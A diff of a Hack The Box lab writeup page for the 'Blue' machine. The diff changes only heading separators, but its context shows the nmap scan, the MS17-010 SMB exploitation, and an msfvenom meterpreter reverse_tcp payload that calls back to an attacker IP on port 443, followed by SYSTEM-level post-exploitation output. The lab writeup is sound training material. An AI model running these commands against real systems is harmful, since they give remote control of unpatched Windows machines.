@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20191101_htb-lame.html"> « </a>📅 published on <code>01/Nov/2019</code><a href="/posts/20191104_htb-grandpa.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/51">Blue</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_blue/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_htb_blue/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>139/tcp/netbios-ssn/Microsoft Windows netbios-ssn</code>: <a href="https://github.com/7h3rAm/writeups#exploit_smb_ms17_010">exploit_smb_ms17_010</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Fri Nov  1 17:05:41 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.blue/results/10.10.10.40/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.blue/results/10.10.10.40/scans/xml/_quick_tcp_nmap.xml 10.10.10.40
 Nmap scan report for 10.10.10.40
@@ -106,7 +106,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 49156/tcp  |  msrpc         |  Microsoft Windows RPC
 49157/tcp  |  msrpc         |  Microsoft Windows RPC
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We now need to create a binary payload file. For this exploit, we will use <code>meterpreter</code> as the payload and then use <code>multi/handler</code> to catch the incoming shell connection. We then slightly tweak the exploit file to first copy the binary payload on to the target system and execute it:  </p>
 <pre class="nested"><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.18 lport=443 -f exe &gt;mtrptr.exe
 subl zzz_exploit.py
@@ -144,7 +144,7 @@ cat C:\Users\haris\Desktop\root.txt
 <p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_blue/screenshot09.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_htb_blue/screenshot10.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_htb_blue/screenshot11.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>ntauth/system@HARIS-PC&gt; id
 NT AUTHORITY\SYSTEM
 ntauth/system@HARIS-PC&gt;  
@@ -172,12 +172,12 @@ ntauth/system@HARIS-PC&gt; users
 Administrator
 haris
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
 <pre class="nested"><code>C:\Users\haris\Desktop\user.txt: 4c546aea7dbee75cbd7.............
 C:\Users\Administrator\Desktop\root.txt: ff548eb71e920ff6c0..............
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.hackthebox.eu/home/machines/profile/51">https://www.hackthebox.eu/home/machines/profile/51</a>  </li>
 <li><a href="https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125">https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125</a>  </li>
